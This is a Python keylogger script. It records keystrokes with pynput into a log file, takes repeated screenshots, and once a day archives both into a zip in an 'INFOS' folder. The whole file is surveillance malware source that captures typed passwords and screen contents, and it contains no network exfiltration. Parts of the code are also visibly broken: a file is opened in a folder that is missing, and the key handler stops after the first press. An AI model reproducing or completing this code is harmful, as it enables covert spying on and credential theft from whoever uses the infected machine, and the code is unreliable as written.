from pynput.keyboard import Key, Listener
from threading import Thread
import shutil
from shutil import copyfile
from logging import handlers
import datetime
import pyautogui
import logging
import time
import os, sys

def CheckDate(): 

    if not os.path.exists("Keylogs"):
        date = open("Keylogs\\Log.txt","r+")
        date.open

    if os.path.exists("Date.txt") != True:
        
        open("Date.txt", 'w')
        actualdate_file = open("Date.txt", "r+")    
        actualdate_file.write(datetime.datetime.now().strftime("%Y-%m-%d"))
        actualdate_file.close() 

    actualdate_file = open("Date.txt", "r+")    
    actualdate = actualdate_file.read()
    actualdate_file.close() 

    if actualdate != datetime.datetime.now().strftime("%Y-%m-%d"):

        actualdate_file = open("Date.txt", "r+")    
        actualdate_file.write(datetime.datetime.now().strftime("%Y-%m-%d"))
        actualdate_file.close()

        MakeZip()

def Screenshot():
     
    Time = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")

    if not os.path.exists("Screenshots"):
        os.makedirs("Screenshots")
        
    pic = pyautogui.screenshot()
    pic.save(os.path.join("Screenshots", "Screenshot #" + str(Time) + ".png"))

def on_press(key):
    log_record = logger.info('"{0}"'.format(key))
    HandlerBasic.emit(log_record)
    
    return False

def Keylogger():

    if not os.path.exists("Keylogs"):
        os.makedirs("Keylogs")
    
    with Listener(on_press=on_press) as listener:
        listener.join()

    HandlerBasic.close()

def MakeZip():

    if not os.path.exists("ZIP"):
        os.makedirs("ZIP")

    HandlerBasic.close()

    shutil.copytree("Screenshots", "ZIP\Screenshots")
    shutil.copytree("Keylogs", "ZIP\Keylogs")

    DaySend = datetime.datetime.now().strftime("%Y-%m-%d")
    shutil.make_archive("INFOS\Info #" + DaySend, 'zip', "ZIP")
    
    shutil.rmtree('ZIP')
    shutil.rmtree("Screenshots")
    shutil.rmtree("Keylogs")

if __name__ == '__main__':

    if not os.path.exists("Keylogs"):
        os.makedirs("Keylogs")

    HandlerBasic = logging.FileHandler("Keylogs/Log.txt", mode='a', encoding="utf-8", delay=False)
    formatter = logging.Formatter(datetime.datetime.now().strftime("%H:%M:%S") + " || %(message)s")
    HandlerBasic.setFormatter(formatter)
    HandlerBasic.setLevel(logging.DEBUG)

    logger = logging.getLogger()
    logger.addHandler(HandlerBasic)
    logger.setLevel(logging.DEBUG)

    while True:
    
        Day = datetime.datetime.now().strftime("%Y-%m-%d")
        
        CheckDate()

        while Day == datetime.datetime.now().strftime("%Y-%m-%d"):

            timeout = 10
            timeout_start = time.time()

            while time.time() < timeout_start + timeout:
                Keylogger()
                
            Screenshot()

        